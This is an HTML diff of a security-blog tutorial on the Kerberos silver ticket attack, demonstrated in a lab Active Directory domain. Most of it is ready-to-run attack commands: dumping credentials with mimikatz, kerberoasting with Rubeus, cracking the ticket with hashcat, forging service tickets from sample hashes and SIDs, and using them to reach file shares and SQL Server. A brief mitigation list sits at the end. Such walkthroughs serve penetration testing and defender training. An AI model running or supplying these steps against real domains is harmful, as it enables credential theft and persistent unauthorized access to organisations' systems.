@@ -1,0 +1,131 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Persistence: Silver Ticket Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/" rel="bookmark"><time class="entry-date published" datetime="2022-05-14T17:23:59+00:00">May 14, 2022</time><time class="updated" datetime="2025-06-19T13:23:35+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">Benjamin Delpy (the creator of mimikatz) introduced the silver ticket attack in Blackhat 2014 in his abusing Kerberos session. An attacker forges silver tickets or TGS tickets for specific services to maintain persistence on a compromised system connected with an Active Directory enterprise domain. In the attack, an attacker can craft a valid TGS of service and use the NTLM hash associated can further craft tickets for other services. The article contains basic theory and demonstration associated with the silver ticket attacks.</span></p>
+<h3><span style="color: #800000">Table of content</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Silver Ticket Theory</strong></span></li>
+<li><span style="color: #000000"><strong>Silver Ticket using Mimikatz</strong></span></li>
+<li><span style="color: #000000"><strong>Silver Ticket using Rubeus</strong></span></li>
+<li><span style="color: #000000"><strong>Mitigation</strong></span></li>
+<li><span style="color: #000000"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000">Silver Ticket Theory</span></h3>
+<p><span style="color: #000000">Before we begin, it is highly recommended you read about golden tickets <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong></span>.</span></p>
+<p><span style="color: #000000">The basic flow of Kerberos can be understood by following our article <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/">here</a></strong></span>. Once you’ve read and understood how Kerberos works, we can proceed with Silver Ticket attack.</span></p>
+<p><span style="color: #000000">With golden ticket attack, we used the hash of a krbtgt account whereas in the case of the silver ticket attack we will use the password hash of a service account. Various methods can extract the password hash of the service account, with Kerberoasting being one. Since the silver ticket attack does not require any intermediary TGT to work, attackers can forge silver tickets without any communication with a Domain Controller, making it stealthier than the golden ticket attack.</span></p>
+<p><span style="color: #000000">The way a silver ticket attack works are as follows:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>STEP 1</strong>: Compromise the password hash (NTLM hash) of a service account. User can use Mimikatz, Kerberoasting etc to do this.</span></li>
+<li><span style="color: #000000"><strong>STEP 2</strong>: For a new ticket by specifying the following things:</span>
+<ul>
+<li><span style="color: #000000"><strong>Service hash</strong></span></li>
+<li><span style="color: #000000"><strong>Service name</strong></span></li>
+<li><span style="color: #000000"><strong>Target FQDN</strong></span></li>
+<li><span style="color: #000000"><strong>Domain SID</strong></span></li>
+</ul>
+</li>
+<li><span style="color: #000000"><strong>STEP 3: </strong>Inject the newly created silver ticket into the terminal session to utilize and maintain persistence</span></li>
+</ul>
+<p><span style="color: #000000">Let’s see this in action.</span></p>
+<h3><span style="color: #800000">Silver Ticket via Mimikatz</span></h3>
+<p><span style="color: #000000">In the demo you will now see, you’ll notice that we have used NTLM hash of the machine account “dc1$.” Many of you might get confused as we had to use the hash of a service account. Please note that a computer also hosts multiple services, one of which is the Common Internet File System Service (<span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview">CIFS</a> </strong></span>– the file sharing service). Thus, the password hash of the CIFS service is the same as the machine account.</span></p>
+<p><span style="color: #000000"><strong>Goal: </strong>Craft a silver ticket to establish persistence on CIFS (sharing) on dc1.ignite.local machine</span></p>
+<p><span style="color: #000000">Since the attack is all related to maintaining persistence, we have to assume the following:</span></p>
+<ul>
+<li><span style="color: #000000">Attacker has compromised a low priv victim machine (here, username: harshitrajpal)</span></li>
+<li><span style="color: #000000">Attacker has somehow gained password/NTLM of the target machine (dc1.ignite.local)</span></li>
+<li><span style="color: #000000">Attacker crafts silver ticket on low priv machine to gain access and maintain persistence on CIFS service on dc1.ignite.local</span></li>
+</ul>
+<p><span style="color: #000000">Let’s first show you our current user, tickets and what happens when we access sharing on dc1.ignite.local</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicAZE9aWw49yFvCEN2cJOzWjIe_G5AqlDaoy44n3lmZX-S166YuTDUGGPyZFIGnZLyM5E-MDe3__tJCsZcqcQ9-2WCItux_IBNBVTfEYwev1YGhvX5atfrti8Cf-vMjQ0OtG8tLfrolMFzEEgg2GmX6eTY7T3BBmv1h1iIf80KJbhX8kO14vSTbYvgLQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000">The above machine was the low priv machine.</span></p>
+<h4><span style="color: #000000">Dumping Hashes and Crafting the Silver Ticket</span></h4>
+<p><span style="color: #000000">Next, we need dc1.ignite.local computer account’s hashes. There could be various methods to do so but we’ll fasttrack and use Mimikatz to obtain it. Let’s activate mimikatz first and dump the hashes using sekurlsa::logonpasswords command. Note that you can follow any method to dump hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+sekurlsa::logonpasswords</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNLcYnRAZlnmL_2zhm-3w8Huw4uUU1dEB51E80P-B5x7H8fCpRx-902bToFCkQBsG6EZ0NJm78z_ijIaX2LKRa9v5fRDalBE2lxNNex1vo5rJ0-lR5fmLuRSRy5YLs20Gq1ALeGWpS_l3q3eM166zq_CiQA-1LdpCBnS7XFBxqdWv64F8WyeOnoRssMg/s16000/2.png"/></span></p>
+<p><span style="color: #000000">This shall dump all the hashes in machine memory including the hash of the machine account. Upon a little scrolling, we found NTLM of our machine account “dc1$”</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgApInarRBN5f2Edquc7O70XTnmKNm7NDeRCi77qigf46iGKfdDdLPU1MQgWqlKi3V29KO1FGGVi714NXRu7I-yS8yomgEwU2j_HpXeNUYguQjpKnY01MAyWHWHHdIwboxQzOqKtk8Wda-SZt-lJBcjnL3Xo06MwSEXx-vBQj5Jr_JwSPPRpoQI177sbA/s16000/3.png"/></span></p>
+<p><span style="color: #000000">Next, to forge a silver ticket we have to find SID of the domain which can easily be found using the command. Please note that the digits after the last hyphen (here, 1115 is called the relative SID and we don’t want that. Everything before that part is the domain SID that is relevant to us)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami /user</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-zzxFaePI-MbGlgyMXyS4OtRTcvChM6Q59chGSl3JDHrfkPvcIKTCPajrMI7VXOwWgMMNZN4nV0gmkuSM7uOyv7xS6wbZMpiPasQbyaPJruWQ1cH7yWLy8M5gOg7QQsYVY4BEOSkxmS0oscTVzcAPEHAAGrSOMcvge7R--To1YHzMgtfvlH76f3zTAA/s16000/4.png"/></span></p>
+<h4><span style="color: #000000">Forging and Using the Silver Ticket</span></h4>
+<p><span style="color: #000000">Now, to forge a silver ticket, Mimikatz’s “golden” module can be used. We just insert our variables.</span></p>
+<p><span style="color: #000000">Here, I am using /ptt flag to insert the ticket directly in the current shell.</span></p>
+<p><span style="color: #000000">/id: It is any random ID that would be visible in the event logs upon inspection. Can be randomized.</span></p>
+<p><span style="color: #000000">/sid: Of the domain. Read more about SID <span style="color: #0000ff"><strong>here</strong></span>.</span></p>
+<p><span style="color: #000000">/domain: Valid FQDN of the target domain</span></p>
+<p><span style="color: #000000">/service: Service for which ticket is generated</span></p>
+<p><span style="color: #000000">/rc4: NTLM hash of the victim machine’s computer account (found previously)</span></p>
+<p><span style="color: #000000">/user: Impersonated username</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::golden /sid:S-1-5-21-2377760704-1974907900-3052042330 /domain:ignite.local /target:dc1.ignite.local /service:cifs /rc4:a5902b4b82ddf1ce42d073f06acecf07 /user:harshitrajpal /ptt /id:1339
+exit
+klist</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4pbgA_fJnfWJHVJfKnwJEsKL6l6si0Vupxx6FaVApcO5vHlEmHdarN4nhOClVCKTkEm39PKRZZcSiNNccnouM6bH3fNmUpY-3bVLqVdJcyHVhYdjP5GUxP-ysu_lfWl7zUpGVsad2qYbdIr0OFAW-p3BPZGBEiwYtKTz7Hj7g6CBZWJuCZG-rGHB6XA/s16000/5.png"/></span></p>
+<p><span style="color: #000000">As you can see above, a ticket has now been saved in the current session’s memory. Now you would be able to access CIFS of the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \dc1.ignite.localc$</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRh5xHeMLApmdBu0vHyGpsImPhiDhY87WImt3_XkyIwIr69BZANc0fqcCX8SquKq_-XYhWHkP2qKhOKA7bQIfIfgW5TxpYpwZm3lp-Gq_2WYZgGUodpuytseUBVpgt3efX-OtCObpFYAiSpAXk--azafH7juYeH0YKZzveZICVz_436Dcdrmi0bw_4Hg/s16000/6.png"/></span></p>
+<p><span style="color: #000000">If, however, you do not want to insert the ticket in memory right away and rather would prefer that a ticket.kirbi file be saved instead, you just remove the “/ptt” flag and leave rest as it is</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::golden /sid:S-1-5-21-2377760704-1974907900-3052042330 /domain:ignite.local /target:dc1.ignite.local /service:cifs /rc4:a5902b4b82ddf1ce42d073f06acecf07 /user:harshitrajpal /id:1339
+exit
+klist
+dir</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK3ochIsZCuNCrqsjXrYvb6-FIxdYKNSvV1U2BCOTlKpsT0r4D9vmeQjO5mB1umrGPQt1o7N4wCqaRs4ajL-gBEwMmpNuK2j2vBuMs2V0Jjqtc4u-mPs_Ai1hZOAq-WCdZ1YTLsTdh27ELjtUZGCQ8Mrj0Pf-YzFRQ-6bHRNbn6Jvds075hXRYZGyiQA/s16000/7.png"/></span></p>
+<p><span style="color: #000000">Now this kirbi ticket can be used with tools like Rubeus ptt module and inserted in memory and used whenever we want</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe ptt /ticket:ticket.kirbi
+klist
+dir \dc1.ignite.localc$</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilj0PEXCnMuDNMg-lnHN0UHh4VaJ2gz1o-zJ__PkAwOX6f45sz3mPoNztgZ1vM-1EfyPpaA77O0wVw71TRJ248lJb8XBslpj3WMFwGpvsTuIHwSP1rDGxHGl89moMoXon8sFCTT0G9iWTUkz-9pcbTMSPJhbWC1KvNipKF0-iPPaRPoMRkUkqYiZvJEg/s16000/8.png"/></span></p>
+<p><span style="color: #000000">And of course, the entire procedure above can be done using Rubeus only.</span></p>
+<h3><span style="color: #800000">Silver Ticket using Rubeus</span></h3>
+<p><span style="color: #000000">We have already seen CIFS as an example and if you’re following the article so far, you’d be able to replicate the same with Rubeus too by using the commands given just a scroll away. However, I wanted to target a different service this time so I set up a SQL server and assigned the service to be run by the user “sqluser” (can be done by going to run-&gt;services.msc-&gt;SQL-&gt;properties-&gt;logon)</span></p>
+<p><span style="color: #000000">This shall make SQL Service run via our newly created service account.</span></p>
+<p><span style="color: #000000">Now, we need to compromise NTLM hash of this account. We will use the Kerberoasting attack for this. Please follow our guide <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/">here</a> </strong></span>to understand the attack but in short, you run the following command in Rubeus.</span></p>
+<h5><strong><span style="color: #000000">Commands</span> </strong></h5>
+<p><span style="color: #000000">/domain: target FQDN</span></p>
+<p><span style="color: #000000">/creduser: Any valid compromised username</span></p>
+<p><span style="color: #000000">/credpassword: Valid password of the compromised user</span></p>
+<p><span style="color: #000000">/nowrap: For the ticket blob to appear in single line in Rubeus</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /domain:ignite.local /creduser:ignite.localaarti /credpassword:Password@1 /nowrap</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLHbIAMWPF1UJF0ACeAx7DcDeCVMB6UuPmN6kQTh-rH3fD7AjrFHuei6AFx_-NrE90cuqhm35aRXntKKqLgBN97cAHEVoW5bgLSmUp5_LRMr4A8ufPextlUrhi2U-oQW_iF9iPM3dqk0ivOYB3fIWHadLoke2qIoWSbDXRWxQi7KVZey7HbnezC2FNww/s16000/9.png"/></span></p>
+<p><span style="color: #000000">As you can see, Rubeus has automatically determined a valid Kerberoastable account and dumped its TGS. We will now extract the Password from this TGS offline using Hashcat</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 13100 '$krb5tgs$23$*sqluser$ignite.local$MSSQLSvc/dc1.ignite.local:1433@ignite.local*$..&lt;snipped&gt;...4297093077601CC' /usr/share/wordlists/rockyou.txt --force</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwVA4VlVmPlr6BMbZDIsxvbeLd6-1HOOkuoxNQ9UhHpZJo4QaNLj5AApTcxI7BgKDHIyygKQiwJwmCzYPtQm7pkJBfW7ecu-kknFz0a_e2z3rtFvsrUl5s8iFs02kPGGpI9bmrUIwXIsVld18j5dpPbpVJJ1qxHy-Y1IYVI5yiVbwtfvdCDlvuJg_-wQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000">In a few seconds we received our clear text password, “Password@1”</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTgW5oll2t7pxShTRY-JAmF-25dj9Sw5p0_6VDeWAsCBlvZo-ki5JzaRnRaw2jWRZjy_ywx5_lS5Xgcxn1BVjZ6RlJoX1qKxy2VCycTvhb9t__wnRuBWokGwAejp8QfMc7ZgXeGeOMo6aJkSQ9_anq03NMDMzeIbPeoFvc9PiyfA0Mcu1E5obSoNmpBg/s16000/11.png"/></span></p>
+<p><span style="color: #000000">Now, let’s convert this into NTLM hash (rc4_hmac) using Rubeus since our silver ticket requires a valid NTLM</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe hash /password:Password@1</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKBbu0ONmAmV7fx6jO4SazkNJG2A3Iq4_bIbmfbpkvNpaZjAknQzaSLziylqiv9UI8U-O4aFkrxy6PK2ZpbGJoGe0SAxKfIRDeVLKkrfGa6dfMa2PO-nuTHV4ccuV9B-P3JYi2B5v5hm6ak2sAo3mhe-unY6oK8bdzFPN0pay-wPif7YgIDG2XiUZXpw/s16000/12.png"/></span></p>
+<p><span style="color: #000000">We also need to know the SID. This can be done using <strong>whoami /user </strong>command</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9X51quHKQwWzsQ5MdUxcF-m0vCdj8v1KUG5Q6pZOKSSmdLlUmfAS-6VM776EDtes3vCnWOWQGxrVaVAv1s2ZKOKrb4C8goidFPhWQPIKF2n40u8Sk7KnAECyZ1NSiy_rUnlBu4lXlSzjDNlSApBaEuke5eRVvHXbFVqKNozuao-FW1GXsRX7DQz5T4A/s16000/13.png"/></span></p>
+<p><span style="color: #000000">Finally, to forge a ticket for the current user in Rubeus we give the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe silver /service:MSSQLSvc/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /sid:S-1-5-21-2377760704-1974907900-3052042330 /user:harshitrajpal /domain:ignite.local /ptt</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvw-PmuJHdu9RsjTCisswfqY-oVZWl4G1VG5BFz0uPLT3QHvuDm3w5GN6Ek9T2w7XmQ2yfm1CUbgPRiBYnZz4LwTPHZvNvVs5Ra0NC_X59VphuE3LAJDVMk_gGPMFhUeCiENputx1-h0hnIEdvyM3AvP1Jbk7W4I0qJn9gdvcolG5CgqDvOcMc_3REDQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000">The /ptt option imports the ticket in the current session altogether. Without /ptt, the system will save the ticket.kirbi file instead. But as you can see, someone has now created a valid silver ticket.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhp7dZXbzAf8xHpYf268_hzmp5MuvprdxS1XHELjEgWJs_IcqyeHjHy-nrTFVBGG5tvXbYd4P6vhjo0U4ZYLSAzNYM12uQ0V_rpWQBDZm2yUVMsD5wgBiv6-J_WVyWJooMCR3UHaOS_e2LrL0EzJu0UQZN7yiWIGRefOm7yycgPEPk5WeqCtILIvL9drQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000">We can now try to log into the server and run a basic command that displays the hostname.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlcmd -S 192.168.1.2,1433
+SELECT HOST_NAME() AS HostName
+go</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZWEifHiEr6TMeRubxJLujatTeWay65ooYGMDNCw6blccqq5BTArf_e4wUnYkLtVQJ_mYxJgVxE1V_KRGLQE5RAqB2BfSWsGKAjrbwav2vkymtcxurA6YVSrnwcZOEKang6qRHIZPsN2bkUoo0LQxj8Hk0-Q3ghsDmBlW1Pz1dvB3cF5X3xIKJSSUxoQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000">And voila! As you can see our user can now connect to the SQL service using the ticket we just forged.</span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<p><span style="color: #000000">Since the attacker uses an offline mechanism and no DC is involved, it becomes difficult to mitigate the attack. However, we can still ensure protection by taking the following steps:</span></p>
+<ul>
+<li><span style="color: #000000">Enable PAC Validation. If enabled, the ticket presented shall be first validated by DC. Thus, silver tickets will be rejected right away.</span></li>
+<li><span style="color: #000000">Use strong passwords to prevent bruteforce demonstrated</span></li>
+<li><span style="color: #000000">Control necessary privileges or whitelist certain users that can use particular services.</span></li>
+<li><span style="color: #000000">Mitigate Kerberoasting</span></li>
+</ul>
+<h3><span style="color: #800000">Conclusion</span></h3>
+<p><span style="color: #000000">The article discussed the Silver Ticket attack and explained how an attacker can forge a particular service’s TGS using this methodology. We also practically demonstrated using 2 tools how an attacker can forge and utilize a silver ticket. In real life, attackers find it quite hard to get a golden ticket, but they can easily forge silver tickets as awareness about Kerberos protection is not widespread. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong><span style="color: #000000"> </span><a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
